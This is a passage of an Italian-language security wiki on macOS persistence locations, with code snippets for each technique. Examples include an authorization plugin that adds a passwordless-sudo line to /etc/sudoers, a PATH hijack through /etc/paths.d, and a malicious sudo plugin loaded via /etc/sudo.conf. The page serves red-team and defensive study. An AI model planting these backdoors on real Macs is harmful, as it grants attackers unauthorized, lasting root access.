  - È inoltre necessario configurare il database di autorizzazione affinché utilizzi il plugin

#### Descrizione e sfruttamento

Puoi creare un plugin di autorizzazione che verrà eseguito quando un utente accede, per mantenere la persistenza. Per ulteriori informazioni su come creare uno di questi plugin, consulta i writeup precedenti (e fai attenzione: un plugin scritto male può impedirti di accedere e dovrai ripulire il Mac dalla modalità di ripristino).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Sposta** il bundle nella posizione da cui verrà caricato:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Infine aggiungi la **regola** per caricare questo Plugin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** indicherà all’authorization framework che dovrà **richiamare un meccanismo esterno per l’autorizzazione**. Inoltre, **`privileged`** farà sì che venga eseguito da root.

Attivalo con:

```bash
security authorize com.asdf.asdf
```

E poi il gruppo **staff dovrebbe avere accesso sudo** (leggi `/etc/sudoers` per verificare).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Utile per aggirare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Ma devi essere root e l'utente deve usare man
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/private/etc/man.conf`**
  - Sono necessari i privilegi di root
  - **`/private/etc/man.conf`**: ogni volta che viene usato man

#### Descrizione e exploit

Il file di configurazione **`/private/etc/man.conf`** indica il binario/script da usare quando si aprono i file della documentazione di man. Quindi è possibile modificare il percorso dell'eseguibile, in modo che ogni volta che l'utente usa man per leggere della documentazione venga eseguita una backdoor.<sup>[[31]](#references)</sup>

Ad esempio, imposta in **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

E poi crea `/tmp/view` come:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Utile per bypassare sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Ma devi essere root e Apache deve essere in esecuzione
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd non dispone di entitlements

#### Posizione

- **`/etc/apache2/httpd.conf`**
  - Sono necessari i privilegi di root
  - Trigger: quando viene avviato Apache2

#### Descrizione ed exploit

Puoi indicare in `/etc/apache2/httpd.conf` di caricare un modulo aggiungendo una riga come questa:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

In questo modo il modulo compilato verrà caricato da Apache. L’unica cosa è che devi **firmarlo con un certificato Apple valido** oppure **aggiungere un nuovo certificato attendibile** al sistema e **firmarlo** con esso.

Poi, se necessario, per assicurarti che il server venga avviato, puoi eseguire:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Esempio di codice per Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Framework di audit BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Ma devi essere root, auditd deve essere in esecuzione e deve generare un avviso
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/etc/security/audit_warn`**
  - Richiede i privilegi di root
  - **Attivazione**: quando auditd rileva un avviso

#### Descrizione e exploit

Ogni volta che auditd rileva un avviso, lo script **`/etc/security/audit_warn`** viene **eseguito**. Quindi potresti aggiungerci il tuo payload.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Potresti forzare un avviso con `sudo audit -n`.

### Elementi di avvio

> [!CAUTION] > **Questa funzione è deprecata, quindi non dovrebbe esserci nulla in quelle directory.**

**StartupItem** è una directory che dovrebbe trovarsi in `/Library/StartupItems/` o in `/System/Library/StartupItems/`. Una volta creata questa directory, deve contenere due file specifici:

1. Uno **script rc**: uno script shell eseguito all'avvio.
2. Un **file plist**, chiamato nello specifico `StartupParameters.plist`, che contiene varie impostazioni di configurazione.

Assicurati che sia lo script rc sia il file `StartupParameters.plist` siano posizionati correttamente nella directory **StartupItem**, affinché il processo di avvio possa riconoscerli e utilizzarli.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Non riesco a trovare questo componente nel mio macOS, quindi per maggiori informazioni consulta il writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Introdotto da Apple, **emond** è un meccanismo di logging che sembra non essere stato sviluppato a fondo o forse essere stato abbandonato, ma è ancora accessibile. Sebbene non sia particolarmente utile per un amministratore Mac, questo servizio poco conosciuto potrebbe essere usato dagli attori delle minacce come metodo di persistenza discreto, probabilmente senza che la maggior parte degli amministratori macOS se ne accorga.<sup>[[34]](#references)</sup>

Per chi sa della sua esistenza, individuare un eventuale uso malevolo di **emond** è semplice. Il LaunchDaemon di sistema per questo servizio cerca gli script da eseguire in un'unica directory. Per verificarlo, si può usare il comando seguente:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Posizione

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Richiede privilegi root
  - **Attivazione**: con XQuartz

#### Descrizione e exploit

XQuartz **non è più installato in macOS**; per maggiori informazioni, consulta il writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Installare un kext è così complicato, anche come root, che non è considerato una tecnica pratica di sandbox escape o persistenza, a meno che non si disponga di un exploit.

#### Posizione

Per installare un KEXT come elemento di avvio, deve essere **installato in una delle seguenti posizioni**:

- `/System/Library/Extensions`
  - File KEXT integrati nel sistema operativo OS X.
- `/Library/Extensions`
  - File KEXT installati da software di terze parti

Puoi elencare i file kext attualmente caricati con:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Per ulteriori informazioni sulle [**estensioni del kernel, consulta questa sezione**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Location

- **`/usr/local/bin/amstoold`**
  - Sono richiesti i privilegi di root

#### Description & Exploitation

A quanto pare, il `plist` di `/System/Library/LaunchAgents/com.apple.amstoold.plist` usava questo binario ed esponeva un servizio XPC... il fatto è che il binario non esisteva, quindi era possibile inserirci qualcosa e, quando veniva chiamato il servizio XPC, veniva eseguito il proprio binario.<sup>[[35]](#references)</sup>

Non riesco più a trovarlo nella mia versione di macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Sono richiesti i privilegi di root
  - **Trigger**: quando viene eseguito il servizio (raramente)

#### Description & exploit

A quanto pare, non è molto comune eseguire questo script e non sono riuscito a trovarlo nella mia versione di macOS, quindi per maggiori informazioni consulta il writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Non funziona nelle versioni moderne di MacOS**

È anche possibile inserire qui **comandi che verranno eseguiti all'avvio.** Esempio di script rc.common standard:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Attività di avvio di launchd

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Utile per bypassare la sandbox: [🔴](https://emojipedia.org/large-red-circle) (richiede root)
- È richiesto root, oltre a un **bypass di SIP** oppure all’autorizzazione **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, a seconda del percorso

#### Posizione

`launchd` incorpora un plist nella sua sezione **`__TEXT,__config`** che descrive le prime «attività di avvio». Diversi script/binari di riferimento che **non** esistono di default e che un attacker può creare:

- Set per il bypass di SIP: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Set TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` esiste già solo da Sequoia in poi)

#### Descrizione e sfruttamento

Esegui il dump della tabella delle attività incorporate per vedere quali file eseguirà `launchd` e quali chiavi sono supportate (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

La creazione di uno dei file citati (ad es. `/etc/rc.server`) fa sì che `launchd` lo esegua al successivo riavvio (userspace). Le voci più utili sono bloccate da SIP o richiedono TCC SysAdminFiles/Full Disk Access, quindi si tratta di una tecnica di livello root attivata dal riavvio.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Al boot, il task `rc.trampoline` esegue un **binario di piattaforma (firmato da Apple)** memorizzato nella variabile NVRAM `apple-trusted-trampoline`, ma **solo se è impostato il boot-arg `rc.trampoline=1` e SIP è disabilitato** (con un limite di dimensione di circa 390&nbsp;KB e il vincolo che l'esecuzione termini rapidamente o restituisca il controllo). Poiché richiede **root + SIP disabilitato + un payload firmato da Apple**, è sostanzialmente impraticabile per la persistenza nel mondo reale ed è elencata qui solo per completezza.<sup>[[41]](#references)</sup>

### /etc/paths e /etc/paths.d (PATH hijack)

- Utile per bypassare la sandbox: [🔴](https://emojipedia.org/large-red-circle) (richiede root per la scrittura)
- Richiede root

#### Posizione

- **`/etc/paths`** e **`/etc/paths.d/*`** — letti da **`path_helper`** (invocato da `/etc/zprofile`) per creare il `PATH` predefinito al login.

#### Descrizione e sfruttamento

Entrambi appartengono a root. Anteporre una directory controllata dall'attaccante (modificando `/etc/paths` o inserendo un file in `/etc/paths.d/`) fa sì che tale directory compaia all'inizio del `PATH` di ogni nuova shell di login, così un binario malevolo con il nome di un comando comune (`ls`, `git`, …) **maschera** quello reale e viene eseguito la volta successiva che la vittima lo invoca.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Utile per bypassare la sandbox: [🔴](https://emojipedia.org/large-red-circle) (richiede root)
- Richiede root; il risultato **bypassa SIP**. macOS **15.0–15.1** è interessato; il problema è stato risolto nella versione **15.2**

#### Posizione

- Inserisci un filesystem bundle in **`/Library/Filesystems/`**.

#### Descrizione e sfruttamento

`storagekitd` possiede l'entitlement **`com.apple.rootless.install.heritable`** e avviava i binari dei filesystem bundle con questa capacità di bypassare SIP **ereditata**. Inserendo un filesystem bundle malevolo, un aggressore poteva eseguire codice con un bypass di SIP per installare **kernel extension persistenti** o scrivere nelle directory `LaunchDaemon` protette da SIP: una persistenza che sopravvive e aggira le protezioni normali.<sup>[[46]](#references)</sup> Apple ha risolto il problema in macOS Sequoia 15.2.

### plugin di sudo (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Utile per bypassare la sandbox: [🔴](https://emojipedia.org/large-red-circle) (richiede root per scrivere in `/etc/sudo.conf`)
- Richiede root per l'installazione; il plugin viene quindi eseguito durante **ogni invocazione di `sudo`** (nel contesto setuid-root)

#### Posizione

- **`/etc/sudo.conf`** — le righe `Plugin` caricano gli oggetti condivisi da **`/usr/libexec/sudo/`** (o da un percorso assoluto). Per impostazione predefinita il file non esiste (sudo usa una policy integrata), quindi crearlo permette di installare un hook senza modifiche preesistenti.

#### Descrizione e sfruttamento

`sudo` carica i suoi plugin di policy/approvazione/audit da `/etc/sudo.conf`. Poiché `sudo` è setuid-root, un plugin con oggetti condivisi malevolo viene eseguito con **privilegi root ogni volta che un utente esegue `sudo`**: una persistenza root duratura che consente anche di osservare ogni comando sudo.<sup>[[51]](#references)</sup> macOS include sudo 1.9.x, che supporta l'API dei plugin.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### Plug-in CoreMediaIO DAL

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Esempio minimo: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Meccanismo legacy:** deprecato da macOS 12.3. macOS 14.1 e versioni successive disabilitano per impostazione predefinita i plug-in video legacy. Prima che questo percorso possa funzionare, l'utente deve ripristinare il supporto video legacy da Recovery; la sola presenza di una directory scrivibile non è sufficiente. [Indicazioni di supporto aggiornate di Apple](https://support.apple.com/en-us/108387).
- È necessario root per scrivere nella directory dei plug-in. L'esecuzione di codice dipende dalla presenza di un client compatibile che carichi ancora i plug-in DAL; non è stata testata a runtime su macOS 26.

#### Posizione

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - È necessario root
  - **Trigger:** un client compatibile per fotocamere enumera i dispositivi **dopo il ripristino del supporto legacy**. La convalida delle librerie del client può bloccare un plug-in di terze parti.

#### Descrizione e sfruttamento

I plug-in **DAL** (Device Abstraction Layer) di CoreMediaIO venivano caricati in-process da alcune applicazioni per fotocamere. La [presentazione di Apple sulle estensioni per fotocamere](https://developer.apple.com/videos/play/wwdc2022/10022/) afferma esplicitamente che i plug-in DAL legacy **non** funzionavano con FaceTime, QuickTime Player o Photo Booth e che molti altri client applicano la convalida delle librerie. Le moderne [estensioni Core Media I/O](https://developer.apple.com/documentation/coremediaio) vengono eseguite out-of-process, con un modello separato di installazione e approvazione. La tecnica storica in-process non implica un bypass generale di Camera TCC sulle versioni attuali di macOS.<sup>[[53]](#references)[[54]](#references)</sup>

Osservazione in sola lettura su macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` esiste ed è di proprietà di root. Non è stato verificato né il supporto legacy né il caricamento da parte di alcun client.

### Plug-in di Directory Service

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Meccanismo legacy e condizionale:** per l'installazione è necessario root e il plug-in deve essere effettivamente configurato e caricato. L'API dei plug-in di DirectoryService è deprecata; prima di considerare questo meccanismo un trigger di avvio, consulta la configurazione di Open Directory del Mac di destinazione.

#### Posizione

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - È necessario root
  - **Trigger:** `dspluginhelperd` carica un plug-in idoneo e configurato quando Open Directory ne ha bisogno. La [guida di Apple sul runtime dei plug-in](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) afferma che i plug-in non configurati per l'avvio possono essere caricati in modo lazy quando viene aperto il relativo nodo.

#### Descrizione e sfruttamento

`dspluginhelperd` supporta i bundle legacy dei plug-in di DirectoryService. Un plug-in malevolo può costituire un percorso di esecuzione con privilegi, se il plug-in legacy viene accettato e attivato; si tratta di un meccanismo distinto da PAM e Authorization Plugins. La presenza della directory non dimostra che un plug-in appena scritto verrà eseguito al successivo avvio. I manuali locali di Apple `dspluginhelperd(8)` e `opendirectoryd(8)` su macOS 26.5 elencano ancora l'helper e questo percorso legacy.<sup>[[53]](#references)</sup>

Osservazione in sola lettura su macOS 26: `/Library/DirectoryServices/PlugIns` e `/usr/libexec/dspluginhelperd` esistono. Durante questo test non è stato installato, configurato o caricato alcun plug-in.

## Tecniche e strumenti di persistenza

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, l'anno degli Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Oltre i soliti LaunchAgents - 1 - file di avvio della shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Oltre i soliti LaunchAgents - 18 - X11 e XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Oltre i soliti LaunchAgents - 21 - Applicazioni riaperte](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Oltre i soliti LaunchAgents - 20 - Preferenze di Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Oltre i soliti LaunchAgents - 13 - Plug-in audio](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Plug-in Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Oltre i soliti LaunchAgents - 12 - Plug-in QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Oltre i soliti LaunchAgents - 22 - LoginHook e LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Oltre i soliti LaunchAgents - 4 - cron job](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Oltre i soliti LaunchAgents - 2 - Avvio di iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Oltre i soliti LaunchAgents - 7 - Plug-in xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Oltre i soliti LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Oltre i soliti LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Oltre i soliti LaunchAgents - 3 - Elementi di login](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Oltre i soliti LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Oltre i soliti LaunchAgents - 24 - Azioni cartella](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Azioni cartella per la persistenza su macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Oltre i soliti LaunchAgents - 27 - Scorciatoie del Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Oltre i soliti LaunchAgents - 17 - Selettori di colore](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Oltre i soliti LaunchAgents - 26 - Plug-in Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analisi della persistenza di "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Oltre i soliti LaunchAgents - 16 - Salvaschermo](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Mantenere l'accesso: salvaschermi per la persistenza su macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Oltre i soliti LaunchAgents - 11 - Importatori Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Oltre i soliti LaunchAgents - 9 - Pannello delle preferenze](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Oltre i soliti LaunchAgents - 19 - Script periodici](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Oltre i soliti LaunchAgents - 5 - Moduli di autenticazione collegabili (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Oltre i soliti LaunchAgents - 28 - Plug-in di autorizzazione](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Furto persistente di credenziali con i plug-in di autorizzazione (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Oltre i soliti LaunchAgents - 30 - Il file di configurazione man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Oltre i soliti LaunchAgents - 25 - Moduli Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Oltre i soliti LaunchAgents - 31 - Framework di audit BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Oltre i soliti LaunchAgents - 23 - emond, il daemon di monitoraggio degli eventi](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Oltre i soliti LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Oltre i soliti LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Oltre i soliti LaunchAgents - 10 - File script delle applicazioni](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Oltre i soliti LaunchAgents - 32 - Plug-in Dock Tile](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Oltre i soliti LaunchAgents - 33 - Widget](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Oltre i soliti LaunchAgents - 34 - Attività di avvio di launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Oltre i soliti LaunchAgents - 35 - Persistenza tramite NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Usare le email per la persistenza su OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Modifica sospetta del plist delle regole di Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Profili malevoli: una delle minacce più gravi per i Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [L'arte del malware per Mac Vol.1 - Cap.0x2 Persistenza (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analisi di CVE-2024-44243, un bypass di SIP di macOS tramite estensioni del kernel (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE ed esfiltrazione di token API tramite i file di progetto di Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nuova vulnerabilità in GitHub Copilot e Cursor - Backdoor nel file Rules (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Metodi di installazione alternativi (estensioni esterne)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Rimuovere ExtensionInstallForcelist in Chrome su Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Scrivere plug-in per sudo (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Sfruttamento remoto dei Mac tramite schemi URL personalizzati (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Due trucchi di persistenza su macOS che sfruttano i plug-in (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Esempio minimo di CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: analisi di una vulnerabilità TCC di macOS basata su Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Documentazione del modulo Python `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
